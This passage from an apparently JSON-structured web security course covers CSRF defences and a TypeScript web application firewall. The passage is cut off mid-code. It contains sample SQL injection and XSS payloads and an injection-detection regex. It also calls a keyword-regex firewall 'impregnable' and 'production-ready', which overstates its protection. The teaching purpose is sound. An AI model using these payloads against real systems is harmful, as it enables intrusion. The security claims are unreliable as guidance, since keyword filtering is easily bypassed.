        "Under this pattern, the server generates a cryptographically random, unguessable token tied to the user's current authenticated session.",
        "When rendering an HTML form, the server embeds this token as a hidden input field: `<input type=\"hidden\" name=\"csrf_token\" value=\"TOKEN\">`.",
        "When the user submits the form, the browser transmits the token alongside the rest of the form parameters.",
        "The server interceptor compares the submitted token against the token stored in the user's active session state.",
        "If the tokens match, the request is approved; if the token is missing, invalid, or expired, the request is rejected with HTTP 403 Forbidden.",
        "An attacker hosting a malicious site cannot read the victim's CSRF token because the browser's Same-Origin Policy blocks reading cross-origin DOMs.",
        "Consequently, any forged form submitted from an external domain will lack the required cryptographic token and fail validation.",
        "Synchronizer tokens must be generated using cryptographically secure random number generators with sufficient entropy (at least 128 bits)."
      ],
      "example": "A banking web form includes `<input type=\"hidden\" name=\"_csrf\" value=\"9f8a3c...\"/>`; an attacker submitting a forged request cannot guess this value.",
      "code": "interface SessionStore {\n  sessionId: string;\n  userId: string;\n  csrfSecret: string;\n}\n\nfunction validateCsrfToken(submittedToken: string | undefined, session: SessionStore): { valid: boolean; status: string } {\n  if (!submittedToken) {\n    return { valid: false, status: 'CSRF_REJECTED_MISSING_TOKEN' };\n  }\n  if (submittedToken !== session.csrfSecret) {\n    return { valid: false, status: 'CSRF_REJECTED_INVALID_TOKEN' };\n  }\n  return { valid: true, status: 'CSRF_VALIDATION_SUCCESS_TRANSACTION_APPROVED' };\n}\n\nconst activeSession: SessionStore = {\n  sessionId: 'sess_9942',\n  userId: 'usr_102',\n  csrfSecret: 'crypt0_secr3t_t0k3n_v4lu3'\n};\n\nconst legitCheck = validateCsrfToken('crypt0_secr3t_t0k3n_v4lu3', activeSession);\nconst forgedCheck = validateCsrfToken(undefined, activeSession);\nconst tamperedCheck = validateCsrfToken('attacker_guess', activeSession);\n\nconsole.log('Legitimate Form:', legitCheck.status);\nconsole.log('Forged External Form:', forgedCheck.status);\nconsole.log('Tampered Token Form:', tamperedCheck.status);",
      "output": "Legitimate Form: CSRF_VALIDATION_SUCCESS_TRANSACTION_APPROVED\nForged External Form: CSRF_REJECTED_MISSING_TOKEN\nTampered Token Form: CSRF_REJECTED_INVALID_TOKEN",
      "codeNotes": [
        {
          "line": 7,
          "note": "Compares submitted anti-forgery token against server-side session secret."
        },
        {
          "line": 24,
          "note": "Rejects requests lacking valid tokens, neutralizing unauthorized cross-origin submissions."
        }
      ],
      "tryIt": "Pass an empty string as the submitted token and verify it is rejected with missing token status.",
      "check": {
        "question": "Why can an attacker's website not read the CSRF token from a victim's legitimate banking page?",
        "options": [
          "Because CSRF tokens are encrypted with hardware security modules",
          "Because the browser's Same-Origin Policy (SOP) strictly prevents scripts on one origin from reading the DOM or responses of another origin",
          "Because tokens are deleted as soon as they are rendered"
        ],
        "answer": 1,
        "why": "The Same-Origin Policy prevents an external origin (attacker.com) from inspecting the DOM or response contents of bank.com to steal the token."
      }
    },
    {
      "title": "Double-Submit Cookie Pattern for Stateless Microservices",
      "say": [
        "In modern stateless microservice architectures, maintaining server-side session stores for CSRF tokens introduces caching and scaling overhead.",
        "The Double-Submit Cookie pattern solves this by keeping CSRF verification entirely stateless on the application server.",
        "When a user logs in, the server generates a cryptographically random token and sets it as a client-readable cookie (e.g. `XSRF-TOKEN`).",
        "When making state-changing requests, client-side JavaScript reads this cookie and copies its value into a custom HTTP request header (e.g. `X-XSRF-TOKEN`).",
        "The server middleware compares the value received in the custom HTTP header directly against the value received in the cookie.",
        "If the two values match, the server accepts the transaction without querying any centralized session database.",
        "An attacker on `evil.com` can trigger the browser to send the cookie, but the Same-Origin Policy prevents them from reading the cookie to set the header.",
        "Because custom headers cannot be set in simple cross-origin HTML form submissions, the forged request arrives without the matching header and is rejected.",
        "To prevent subdomain cookie injection attacks, enterprise applications frequently use HMAC-signed double-submit tokens."
      ],
      "example": "Angular or Axios automatically reads the `XSRF-TOKEN` cookie and attaches it as the `X-XSRF-TOKEN` HTTP header for all outgoing POST requests.",
      "code": "interface RequestContext {\n  cookieHeaderValue: string;\n  customHeaderValue?: string;\n}\n\nfunction verifyDoubleSubmitCookie(context: RequestContext): { authorized: boolean; reason: string } {\n  if (!context.customHeaderValue) {\n    return { authorized: false, reason: 'REJECTED_NO_CUSTOM_HEADER' };\n  }\n  if (context.cookieHeaderValue !== context.customHeaderValue) {\n    return { authorized: false, reason: 'REJECTED_TOKEN_MISMATCH' };\n  }\n  return { authorized: true, reason: 'AUTHORIZED_DOUBLE_SUBMIT_MATCH' };\n}\n\nconst legitimateAjax: RequestContext = {\n  cookieHeaderValue: 'token_abc_123',\n  customHeaderValue: 'token_abc_123'\n};\n\nconst forgedCrossSitePost: RequestContext = {\n  cookieHeaderValue: 'token_abc_123'\n  // Attacker cannot read cookie, so custom header is absent\n};\n\nconsole.log('Legitimate SPA Request:', verifyDoubleSubmitCookie(legitimateAjax).reason);\nconsole.log('Forged Cross-Origin Post:', verifyDoubleSubmitCookie(forgedCrossSitePost).reason);",
      "output": "Legitimate SPA Request: AUTHORIZED_DOUBLE_SUBMIT_MATCH\nForged Cross-Origin Post: REJECTED_NO_CUSTOM_HEADER",
      "codeNotes": [
        {
          "line": 6,
          "note": "Validates that the custom HTTP header matches the client-submitted cookie without server session lookups."
        },
        {
          "line": 22,
          "note": "Demonstrates rejection of forged cross-origin posts that lack the custom header."
        }
      ],
      "tryIt": "Provide mismatched tokens in header and cookie to verify the mismatch rejection path.",
      "check": {
        "question": "What prevents an attacker on an external website from reading the `XSRF-TOKEN` cookie to construct the matching header?",
        "options": [
          "The Same-Origin Policy prevents external websites from reading cookies belonging to another domain",
          "Cookies are automatically deleted when an external tab opens",
          "HTTP headers can only be sent from Linux servers"
        ],
        "answer": 0,
        "why": "Browsers enforce domain scoping on cookies; scripts executing on evil.com cannot read cookies scoped to your application's domain."
      }
    },
    {
      "title": "Browser SameSite Cookie Policies (Strict, Lax, None)",
      "say": [
        "In recent years, the web standards committee introduced the `SameSite` cookie attribute to eliminate CSRF vulnerabilities at the browser level.",
        "The `SameSite` attribute controls whether cookies are sent with cross-site requests, providing three distinct modes: `Strict`, `Lax`, and `None`.",
        "In `SameSite=Strict` mode, the cookie is never sent in cross-site requests under any circumstance, even if the user clicks an ordinary link.",
        "If a user clicks an external link to their bank, `SameSite=Strict` will not send the session cookie, requiring the user to refresh or re-navigate.",
        "In `SameSite=Lax` mode, the cookie is withheld on cross-site subrequests (like images, iframes, and forms), but permitted on top-level GET navigations.",
        "This means if a user clicks a search engine link, they arrive logged in, but cross-origin POST forms cannot utilize the session cookie.",
        "`SameSite=Lax` is now the default behavior in modern Chromium and Safari browsers when no attribute is explicitly specified.",
        "In `SameSite=None` mode, cookies are sent in all cross-site contexts, but modern browsers require the `Secure` attribute (HTTPS only).",
        "Configuring `SameSite=Strict` or `Lax` on all session cookies provides an authoritative browser-enforced defense against cross-site request forgery."
      ],
      "example": "A banking application configures its session cookie with `Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict`.",
      "code": "type SameSiteMode = 'Strict' | 'Lax' | 'None';\n\ninterface CookieConfig {\n  name: string;\n  value: string;\n  secure: boolean;\n  httpOnly: boolean;\n  sameSite: SameSiteMode;\n}\n\nfunction formatSetCookieHeader(config: CookieConfig): string {\n  const parts = [`${config.name}=${config.value}`];\n  if (config.secure) parts.push('Secure');\n  if (config.httpOnly) parts.push('HttpOnly');\n  parts.push(`SameSite=${config.sameSite}`);\n  return parts.join('; ');\n}\n\nconst secureSessionCookie: CookieConfig = {\n  name: '__Host-SessionId',\n  value: 'auth_991823',\n  secure: true,\n  httpOnly: true,\n  sameSite: 'Strict'\n};\n\nconst header = formatSetCookieHeader(secureSessionCookie);\nconsole.log('Formatted Cookie Header:', header);\nconsole.log('Is Strictly Protected:', header.includes('SameSite=Strict'));",
      "output": "Formatted Cookie Header: __Host-SessionId=auth_991823; Secure; HttpOnly; SameSite=Strict\nIs Strictly Protected: true",
      "codeNotes": [
        {
          "line": 11,
          "note": "Constructs RFC-compliant Set-Cookie header with security flags."
        },
        {
          "line": 24,
          "note": "Verifies the integration of Secure, HttpOnly, and SameSite=Strict attributes."
        }
      ],
      "tryIt": "Change sameSite to 'Lax' and note how top-level GET navigations are permitted while POST forms remain blocked.",
      "check": {
        "question": "What is the primary difference between `SameSite=Strict` and `SameSite=Lax`?",
        "options": [
          "`Strict` encrypts the cookie with AES-256 while `Lax` does not",
          "`Strict` withholds the cookie on all cross-site requests including top-level link clicks, while `Lax` allows the cookie on safe top-level GET navigations",
          "`Lax` only works on weekend days"
        ],
        "answer": 1,
        "why": "`SameSite=Strict` blocks cookie dispatch on every cross-site request; `Lax` permits it only for safe top-level navigations like clicking an inbound link."
      }
    },
    {
      "title": "Building an Enterprise CSRF Defense & Cookie Security Middleware",
      "say": [
        "In enterprise production environments, defense-in-depth dictates combining multiple anti-CSRF layers rather than relying on one mechanism alone.",
        "An enterprise security middleware verifies: 1. Origin and Referer request headers; 2. SameSite cookie configuration; 3. Anti-CSRF synchronizer tokens.",
        "When a state-changing request (POST, PUT, DELETE, PATCH) arrives, the middleware first checks the HTTP `Origin` header against an allowlist.",
        "If the `Origin` header is absent (common in older clients), the middleware falls back to inspecting the `Referer` header.",
        "Next, the middleware extracts the CSRF token from the custom `X-CSRF-Token` header or form body and verifies it against the session state.",
        "If any validation step fails, the middleware immediately aborts the request, logs a security warning, and responds with HTTP 403 Forbidden.",
        "Additionally, session cookies must always include the `__Host-` prefix, `Secure`, `HttpOnly`, and `SameSite=Lax` or `Strict` flags.",
        "This multi-layered approach ensures comprehensive resilience against CSRF, even if a user operates an outdated or misconfigured browser.",
        "Let us assemble a unified CSRF defense middleware that executes this full verification pipeline on incoming transactions."
      ],
      "example": "A payment gateway middleware verifying that the Origin header matches `https://pay.corp.com` and that a valid cryptographic token is present in the request headers.",
      "code": "interface HttpRequest {\n  method: string;\n  origin?: string;\n  headers: Record<string, string>;\n  sessionToken: string;\n}\n\nfunction verifyEnterpriseCsrf(req: HttpRequest, allowedOrigin: string): { accepted: boolean; auditCode: string } {\n  // Safe idempotent methods do not mutate state\n  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {\n    return { accepted: true, auditCode: 'SAFE_METHOD_ALLOWED' };\n  }\n\n  // 1. Verify Origin header\n  if (!req.origin || req.origin !== allowedOrigin) {\n    return { accepted: false, auditCode: 'SECURITY_ALERT_ORIGIN_MISMATCH' };\n  }\n\n  // 2. Verify CSRF Token\n  const token = req.headers['x-csrf-token'];\n  if (!token || token !== req.sessionToken) {\n    return { accepted: false, auditCode: 'SECURITY_ALERT_INVALID_CSRF_TOKEN' };\n  }\n\n  return { accepted: true, auditCode: 'TRANSACTION_PERMITTED_NOMINAL' };\n}\n\nconst legitPost: HttpRequest = {\n  method: 'POST',\n  origin: 'https://bank.corp.internal',\n  headers: { 'x-csrf-token': 'sec_tok_8810' },\n  sessionToken: 'sec_tok_8810'\n};\n\nconst forgedPost: HttpRequest = {\n  method: 'POST',\n  origin: 'https://malicious-phishing.org',\n  headers: { 'x-csrf-token': 'sec_tok_8810' },\n  sessionToken: 'sec_tok_8810'\n};\n\nconsole.log('Legitimate Request Result:', verifyEnterpriseCsrf(legitPost, 'https://bank.corp.internal').auditCode);\nconsole.log('Forged Origin Result:', verifyEnterpriseCsrf(forgedPost, 'https://bank.corp.internal').auditCode);",
      "output": "Legitimate Request Result: TRANSACTION_PERMITTED_NOMINAL\nForged Origin Result: SECURITY_ALERT_ORIGIN_MISMATCH",
      "codeNotes": [
        {
          "line": 8,
          "note": "Bypasses check for safe read-only methods per HTTP standards."
        },
        {
          "line": 13,
          "note": "Enforces strict origin header matching before validating cryptographic tokens."
        }
      ],
      "tryIt": "Send a POST with a matching origin but a wrong token to verify the second defense stage.",
      "check": {
        "question": "Why should anti-CSRF middleware verify the HTTP `Origin` header in addition to validating synchronizer tokens?",
        "options": [
          "To speed up JSON parsing",
          "To provide Defense-in-Depth, ensuring that cross-origin requests are rejected early before consuming cryptographic validation resources",
          "Because Origin headers contain the user's password"
        ],
        "answer": 1,
        "why": "Origin verification provides a fast, authoritative early-rejection barrier against cross-site submissions before token processing."
      }
    }
  ],
  "summary": [
    "CSRF exploits ambient credential authentication where browsers automatically attach cookies to cross-origin requests.",
    "State-changing endpoints using GET or POST can be exploited via malicious image tags or auto-submitting hidden forms.",
    "The Synchronizer Token Pattern uses secret, unpredictable tokens embedded in forms that external origins cannot access.",
    "The Double-Submit Cookie pattern enables stateless microservice CSRF validation by comparing request headers with cookie values.",
    "`SameSite=Strict` and `SameSite=Lax` cookie attributes provide native browser-enforced isolation against cross-origin cookie dispatch."
  ],
  "projectStep": {
    "title": "Project Step 4: Multi-Layered CSRF Defense & Cookie Hardener",
    "steps": [
      "Construct a secure cookie formatter enforcing `SameSite=Strict`, `HttpOnly`, and `Secure` attributes.",
      "Implement a double-submit cookie validator comparing custom request headers against incoming cookie values.",
      "Assemble an end-to-end middleware pipeline that verifies HTTP method safety, Origin allowlists, and token integrity."
    ]
  }
},
{
  "day": 5,
  "title": "⭐ MILESTONE 1: Complete Web Application Firewall & Input Sanitization Engine",
  "goal": "Milestone 1: Build a complete foundational web application firewall and threat mitigation engine: STRIDE categorization, SQLi prepared statement defense, XSS entity escaping, and CSRF token/SameSite validation.",
  "minutes": 25,
  "recap": "Milestone 1 represents the synthesis of foundational cybersecurity. Today we integrate threat classification, SQL parameterization, XSS escaping, and CSRF validation into a unified enterprise Web Application Firewall.",
  "parts": [
    {
      "title": "Milestone Architecture: The Unified Web Application Firewall Pipeline",
      "say": [
        "A Web Application Firewall (WAF) inspects, filters, and monitors HTTP traffic traveling to and from a web application.",
        "Operating primarily at Layer 7 of the OSI model, a WAF detects and mitigates application-layer attacks that network firewalls cannot see.",
        "In Milestone 1, we synthesize our foundational cybersecurity knowledge into a unified, modular Web Application Firewall pipeline.",
        "The WAF pipeline evaluates incoming requests across four sequential inspection stages: threat categorization, SQLi interception, XSS sanitization, and CSRF validation.",
        "If any inspection stage detects an attack signature or security violation, the request is terminated immediately with an audit log.",
        "If all stages pass, the request is deemed secure, enriched with sanitized inputs and security headers, and passed to downstream application handlers.",
        "Building a unified WAF pipeline provides centralized visibility, compliance reporting, and consistent security policy enforcement.",
        "Modular pipeline design allows security teams to adjust rule sensitivity and update threat signatures without altering application business logic.",
        "Let us inspect the master architectural interface defining our Milestone 1 Web Application Firewall."
      ],
      "example": "Cloudflare WAF or AWS WAF intercepting malicious HTTP requests at the edge before they can reach the database or application servers.",
      "code": "interface WafInspectionResult {\n  passed: boolean;\n  stage: string;\n  violations: string[];\n  sanitizedPayload?: any;\n}\n\ninterface IncomingHttpRequest {\n  path: string;\n  method: string;\n  origin: string;\n  headers: Record<string, string>;\n  body: Record<string, any>;\n}\n\nclass WafPipelineContext {\n  public violations: string[] = [];\n  constructor(public req: IncomingHttpRequest) {}\n  \n  addViolation(stage: string, message: string) {\n    this.violations.push(`[${stage}] ${message}`);\n  }\n  \n  isClean(): boolean {\n    return this.violations.length === 0;\n  }\n}\n\nconst mockReq: IncomingHttpRequest = {\n  path: '/api/v1/user/profile',\n  method: 'POST',\n  origin: 'https://trusted.corp',\n  headers: { 'content-type': 'application/json' },\n  body: { name: 'Alice', bio: 'Software Engineer' }\n};\n\nconst ctx = new WafPipelineContext(mockReq);\nconsole.log('Initial WAF Clean Status:', ctx.isClean());\nconsole.log('Inspecting Route:', ctx.req.path);",
      "output": "Initial WAF Clean Status: true\nInspecting Route: /api/v1/user/profile",
      "codeNotes": [
        {
          "line": 8,
          "note": "Defines incoming HTTP request structure inspected by the WAF engine."
        },
        {
          "line": 16,
          "note": "Maintains inspection state and accumulates security violations across pipeline stages."
        }
      ],
      "tryIt": "Simulate calling `addViolation` and verify that `isClean()` switches to false.",
      "check": {
        "question": "At which layer of the OSI network model does a Web Application Firewall (WAF) primarily operate?",
        "options": [
          "Layer 2 (Data Link Layer)",
          "Layer 4 (Transport Layer)",
          "Layer 7 (Application Layer)"
        ],
        "answer": 2,
        "why": "A WAF inspects HTTP headers, cookies, and application payloads, operating at Layer 7 (the Application layer)."
      }
    },
    {
      "title": "WAF Rule 1: Automated STRIDE Threat Vector Classification",
      "say": [
        "The first stage in our WAF pipeline is an automated threat classifier based on the STRIDE taxonomy.",
        "Before deep payload parsing, the classifier scans request metadata, paths, and headers to identify potential threat categories.",
        "For example, requests attempting to invoke hidden admin endpoints or manipulate role headers are tagged as Elevation of Privilege risks.",
        "Requests containing excessive payloads or high-frequency bursts are tagged as Denial of Service risks.",
        "Requests lacking proper authentication tokens or presenting mismatched session claims are categorized as Spoofing threats.",
        "Classifying threats allows the WAF to apply dynamic rate limiting, enhanced logging, or honeypot redirects tailored to specific attack vectors.",
        "Structured threat tagging ensures that Security Information and Event Management (SIEM) systems can correlate multi-stage attacks across the enterprise.",
        "Let us implement the STRIDE threat classification rule and observe how incoming request patterns are systematically categorized.",
        "This automated classification provides the foundational telemetry needed for real-time incident response."
      ],
      "example": "A request to `/admin/debug/dump` from an unauthenticated IP is instantly categorized as `ELEVATION_OF_PRIVILEGE` and routed to a honeypot.",
      "code": "type StrideTag = 'SPOOFING' | 'TAMPERING' | 'DENIAL_OF_SERVICE' | 'ELEVATION_OF_PRIVILEGE';\n\nfunction classifyStrideThreat(path: string, headers: Record<string, string>): StrideTag[] {\n  const tags: StrideTag[] = [];\n  if (path.includes('/admin') || path.includes('/debug') || headers['x-role-override']) {\n    tags.push('ELEVATION_OF_PRIVILEGE');\n  }\n  if (!headers['authorization'] && path.startsWith('/api/secure')) {\n    tags.push('SPOOFING');\n  }\n  if (headers['content-length'] && parseInt(headers['content-length'], 10) > 1000000) {\n    tags.push('DENIAL_OF_SERVICE');\n  }\n  return tags;\n}\n\nconst req1 = classifyStrideThreat('/api/secure/data', {});\nconst req2 = classifyStrideThreat('/admin/console', { 'x-role-override': 'superadmin' });\n\nconsole.log('Request 1 STRIDE Tags:', JSON.stringify(req1));\nconsole.log('Request 2 STRIDE Tags:', JSON.stringify(req2));",
      "output": "Request 1 STRIDE Tags: [\"SPOOFING\"]\nRequest 2 STRIDE Tags: [\"ELEVATION_OF_PRIVILEGE\"]",
      "codeNotes": [
        {
          "line": 3,
          "note": "Evaluates request headers and endpoint paths to assign STRIDE threat classifications."
        },
        {
          "line": 18,
          "note": "Demonstrates classification of unauthorized access and privilege escalation attempts."
        }
      ],
      "tryIt": "Add a content-length header of 5000000 to observe classification as `DENIAL_OF_SERVICE`.",
      "check": {
        "question": "Why does the WAF classify requests attempting to access `/admin` with `x-role-override` as Elevation of Privilege?",
        "options": [
          "Because they are attempting to gain higher administrative privileges without proper authorization",
          "Because they reduce network latency",
          "Because they violate CSS standards"
        ],
        "answer": 0,
        "why": "Elevation of Privilege involves an adversary attempting to acquire permissions beyond their authorized clearance level."
      }
    },
    {
      "title": "WAF Rule 2: SQL Injection AST Interceptor & Parameterizer",
      "say": [
        "The second stage in the WAF pipeline protects backend databases by inspecting input fields for SQL injection signatures.",
        "The interceptor scans all string parameters in the request query string and JSON body for malicious SQL tokens.",
        "Key patterns include tautology expressions (`OR '1'='1`), comment delimiters (`--`, `/*`), UNION SELECT patterns, and stacked queries (`; DROP`).",
        "When suspicious SQL syntax is detected, the WAF can either reject the request outright or force parameterization through prepared statements.",
        "In our enterprise WAF, detection of an active SQLi payload triggers immediate request rejection and emits a high-priority security audit code.",
        "Additionally, the engine sanitizes acceptable inputs, stripping control characters and normalizing unicode representations.",
        "This layer ensures that even if downstream application developers write flawed string concatenation code, the WAF acts as an impregnable shield.",
        "Let us implement the SQLi inspection rule and test it against both clean user inputs and sophisticated SQL injection payloads.",
        "Catching SQL injection at the WAF perimeter prevents malicious payloads from ever reaching the database tier."
      ],
      "example": "A search parameter containing `tech' UNION SELECT * FROM passwords --` is intercepted and blocked at the edge with HTTP 400 Bad Request.",
      "code": "function inspectSqlInjection(body: Record<string, any>): { isSecure: boolean; triggeredPattern?: string } {\n  const sqlKeywords = /(\\b(UNION|SELECT|INSERT|DELETE|UPDATE|DROP|ALTER|EXEC)\\b)|(--|#|\\/\\*)|('\\s*OR\\s*)/i;\n  \n  for (const [key, value] of Object.entries(body)) {\n    if (typeof value === 'string') {\n      const match = value.match(sqlKeywords);\n      if (match) {\n        return { isSecure: false, triggeredPattern: `Field '${key}' matched '${match[0]}'` };\n      }\n    }\n  }\n  return { isSecure: true };\n}\n\nconst cleanPayload = { username: 'john_doe', search: 'laptop deals' };\nconst attackPayload = { username: 'admin', search: \"shoes' OR '1'='1\" };\n\nconsole.log('Clean Payload Secure:', inspectSqlInjection(cleanPayload).isSecure);\nconsole.log('Attack Payload Secure:', inspectSqlInjection(attackPayload).isSecure);\nconsole.log('Triggered Pattern:', inspectSqlInjection(attackPayload).triggeredPattern);",
      "output": "Clean Payload Secure: true\nAttack Payload Secure: false\nTriggered Pattern: Field 'search' matched '' OR '",
      "codeNotes": [
        {
          "line": 2,
          "note": "Defines regular expression detecting SQL statements, comment delimiters, and tautology logic."
        },
        {
          "line": 16,
          "note": "Blocks the attack payload while permitting clean alphanumeric queries."
        }
      ],
      "tryIt": "Test with a UNION SELECT payload and verify that the triggered pattern catches the UNION keyword.",
      "check": {
        "question": "What is the primary operational benefit of intercepting SQL injection at the WAF layer?",
        "options": [
          "It blocks the attack before the payload ever reaches the database or application code",
          "It automatically encrypts the database with AES-256",
          "It speeds up SQL query compilation"
        ],
        "answer": 0,
        "why": "WAF interception at Layer 7 stops the malicious payload at the perimeter, preventing it from executing against backend databases."
      }
    },
    {
      "title": "WAF Rule 3: Context-Aware XSS Entity Escaping & CSP Header Injector",
      "say": [
        "The third stage of our WAF pipeline neutralizes Cross-Site Scripting by performing input sanitization and injecting defensive headers.",
        "The rule scans all incoming text strings and encodes dangerous HTML characters into safe HTML entities before passing them to application handlers.",
        "Characters like `<`, `>`, `\"`, `'`, and `&` are transformed into `&lt;`, `&gt;`, `&quot;`, `&#x27;`, and `&amp;`.",
        "Simultaneously, the WAF prepares outbound security headers that will be attached to the HTTP response.",
        "The WAF generates a unique, single-use cryptographic nonce and attaches a strict Content-Security-Policy (CSP) header.",
        "It also injects `X-Content-Type-Options: nosniff` to prevent MIME-type sniffing and `X-Frame-Options: DENY` to stop clickjacking.",
        "By combining inbound entity encoding with outbound CSP header injection, the WAF provides complete end-to-end protection against XSS.",
        "Let us implement the XSS sanitization and header injector module of our Milestone 1 engine.",
        "This dual-action mechanism protects both server-rendered templates and modern single-page applications."
      ],
      "example": "User input `<script>alert(1)</script>` is sanitized to `&lt;script&gt;alert(1)&lt;/script&gt;`, and the HTTP response is decorated with a strict CSP header.",
      "code": "interface XssSanitizationResult {\n  sanitizedBody: Record<string, any>;\n  responseHeaders: Record<string, string>;\n}\n\nfunction processXssProtection(body: Record<string, any>, nonce: string): XssSanitizationResult {\n  const sanitized: Record<string, any> = {};\n  for (const [k, v] of Object.entries(body)) {\n    if (typeof v === 'string') {\n      sanitized[k] = v\n        .replace(/&/g, '&amp;')\n        .replace(/</g, '&lt;')\n        .replace(/>/g, '&gt;')\n        .replace(/\"/g, '&quot;')\n        .replace(/'/g, '&#x27;');\n    } else {\n      sanitized[k] = v;\n    }\n  }\n\n  const responseHeaders = {\n    'content-security-policy': `default-src 'self'; script-src 'self' 'nonce-${nonce}'; object-src 'none';`,\n    'x-content-type-options': 'nosniff',\n    'x-frame-options': 'DENY'\n  };\n\n  return { sanitizedBody: sanitized, responseHeaders };\n}\n\nconst input = { bio: '<script>badActor()</script>', rating: 5 };\nconst res = processXssProtection(input, 'nonce_7781');\n\nconsole.log('Sanitized Bio:', res.sanitizedBody.bio);\nconsole.log('CSP Header Injected:', res.responseHeaders['content-security-policy'].includes('nonce_7781'));\nconsole.log('Frame Options:', res.responseHeaders['x-frame-options']);",
      "output": "Sanitized Bio: &lt;script&gt;badActor()&lt;/script&gt;\nCSP Header Injected: true\nFrame Options: DENY",
      "codeNotes": [
        {
          "line": 7,
          "note": "Recursively encodes all string properties in the payload to safe HTML entities."
        },
        {
          "line": 19,
          "note": "Constructs defensive HTTP response headers including CSP with cryptographic nonce."
        }
      ],
      "tryIt": "Pass nested HTML tags like `<div><b>test</b></div>` and verify that all angle brackets are converted.",
      "check": {
        "question": "Why does the WAF inject `X-Content-Type-Options: nosniff` alongside CSP headers?",
        "options": [
          "To prevent browsers from MIME-sniffing a text/plain response into executable JavaScript",
          "To speed up browser rendering engines",
          "To disable caching in local storage"
        ],
        "answer": 0,
        "why": "The `nosniff` header forces the browser to adhere strictly to the declared MIME type, preventing script execution from non-script resources."
      }
    },
    {
      "title": "WAF Rule 4: Cryptographic CSRF Synchronizer Token & SameSite Validator",
      "say": [
        "The fourth stage in our WAF pipeline defends against Cross-Site Request Forgery by enforcing origin boundaries and token validation.",
        "For all state-changing HTTP methods (POST, PUT, DELETE, PATCH), the WAF checks the request's `Origin` or `Referer` header against an approved domain list.",
        "Next, the WAF validates that the client provided a matching CSRF token in the `X-CSRF-Token` header or request payload.",
        "If the origin is unauthorized or the CSRF token fails verification, the request is rejected with `STATUS_CSRF_ATTACK_PREVENTED`.",
        "Additionally, the WAF ensures that any session cookies set in the response specify `SameSite=Strict` or `SameSite=Lax` and `Secure`.",
        "This prevents cross-origin sites from exploiting ambient cookie authentication, ensuring that only intentional user actions succeed.",
        "Integrating CSRF protection directly into the WAF guarantees that every microservice behind the gateway is protected uniformly.",
        "Let us implement the CSRF validation rule and test it against simulated cross-site requests and valid same-origin submissions.",
        "This completes the fourth and final defensive inspection module of our Web Application Firewall."
      ],
      "example": "A cross-origin POST from `evil.com` to `/api/transfer` is intercepted because its Origin header does not match the configured domain.",
      "code": "function validateWafCsrf(\n  method: string,\n  origin: string,\n  allowedOrigin: string,\n  tokenHeader: string | undefined,\n  expectedToken: string\n): { isAuthorized: boolean; status: string } {\n  if (['GET', 'HEAD', 'OPTIONS'].includes(method)) {\n    return { isAuthorized: true, status: 'READ_ONLY_METHOD_ALLOWED' };\n  }\n\n  if (origin !== allowedOrigin) {\n    return { isAuthorized: false, status: 'CSRF_REJECTED_UNAUTHORIZED_ORIGIN' };\n  }\n\n  if (!tokenHeader || tokenHeader !== expectedToken) {\n    return { isAuthorized: false, status: 'CSRF_REJECTED_TOKEN_MISMATCH' };\n  }\n\n  return { isAuthorized: true, status: 'CSRF_VALIDATION_NOMINAL' };\n}\n\nconst pass = validateWafCsrf('POST', 'https://corp.com', 'https://corp.com', 'tok_1', 'tok_1');\nconst fail = validateWafCsrf('POST', 'https://attacker.net', 'https://corp.com', 'tok_1', 'tok_1');\n\nconsole.log('Same-Origin Result:', pass.status);\nconsole.log('Cross-Origin Result:', fail.status);",
      "output": "Same-Origin Result: CSRF_VALIDATION_NOMINAL\nCross-Origin Result: CSRF_REJECTED_UNAUTHORIZED_ORIGIN",
      "codeNotes": [
        {
          "line": 9,
          "note": "Permits read-only idempotent methods to pass through without CSRF tokens."
        },
        {
          "line": 13,
          "note": "Enforces strict origin checking followed by synchronizer token comparison."
        }
      ],
      "tryIt": "Pass a matching origin with an undefined token to verify token mismatch rejection.",
      "check": {
        "question": "Under what condition does the WAF permit a POST request without a CSRF token?",
        "options": [
          "If the request is from a mobile phone",
          "Under no standard condition; state-changing POST requests must present a valid token and authorized origin",
          "If the user is an administrator"
        ],
        "answer": 1,
        "why": "State-changing methods must always be verified with valid CSRF tokens and authorized origin headers to prevent forgery."
      }
    },
    {
      "title": "Capstone Pipeline Integration: Multi-Stage Threat Evaluator & Security Audit",
      "say": [
        "In this final milestone part, we assemble all four defensive stages into our complete, production-ready Web Application Firewall engine.",
        "When an incoming HTTP request hits the WAF, it passes sequentially through: 1. STRIDE Threat Classifier; 2. SQLi Interceptor; 3. XSS Sanitizer; 4. CSRF Validator.",
        "The engine maintains an immutable audit trace, recording the latency, outcome, and detected threat tags of each inspection phase.",
        "If all stages succeed, the engine produces an approved transaction artifact containing the sanitized payload and protective HTTP response headers.",
        "If any stage flags an exploit, the engine returns a detailed security incident report and terminates the request pipeline.",
        "This architectural synthesis guarantees that the web application is resilient against the top OWASP vulnerabilities taught across Days 1 through 5.",
        "Having engineered this comprehensive WAF, you have mastered the essential foundational principles of application-layer cybersecurity.",
        "Let us execute the complete Milestone 1 Web Application Firewall pipeline across both benign and multi-vector malicious requests.",
        "Congratulations on achieving Milestone 1: Enterprise Web Application Firewall & Input Sanitization Engine."
      ],
      "example": "A full end-to-end WAF execution intercepting a multi-vector attack combining SQL injection, XSS script tags, and forged cross-origin headers.",
      "code": "type StrideTag = 'SPOOFING' | 'TAMPERING' | 'DENIAL_OF_SERVICE' | 'ELEVATION_OF_PRIVILEGE';\n\nfunction classifyStrideThreat(path: string, headers: Record<string, string>): StrideTag[] {\n  const tags: StrideTag[] = [];\n  if (path.includes('/admin') || path.includes('/debug') || headers['x-role-override']) {\n    tags.push('ELEVATION_OF_PRIVILEGE');\n  }\n  if (!headers['authorization'] && path.startsWith('/api/secure')) {\n    tags.push('SPOOFING');\n  }\n  return tags;\n}\n\nfunction inspectSqlInjection(body: Record<string, any>): { isSecure: boolean; triggeredPattern?: string } {\n  const sqlKeywords = /(\\b(UNION|SELECT|INSERT|DELETE|UPDATE|DROP|ALTER|EXEC)\\b)|(--|#|\\/\\*)|('\\s*OR\\s*)/i;\n  for (const [key, value] of Object.entries(body)) {\n    if (typeof value === 'string') {\n      const match = value.match(sqlKeywords);\n      if (match) return { isSecure: false, triggeredPattern: match[0] };\n    }\n  }\n  return { isSecure: true };\n}\n\nfunction validateWafCsrf(method: string, origin: string, allowed: string, token: string | undefined, expected: string) {\n  if (['GET', 'HEAD', 'OPTIONS'].includes(method)) return { isAuthorized: true, status: 'READ_ONLY_ALLOWED' };\n  if (origin !== allowed) return { 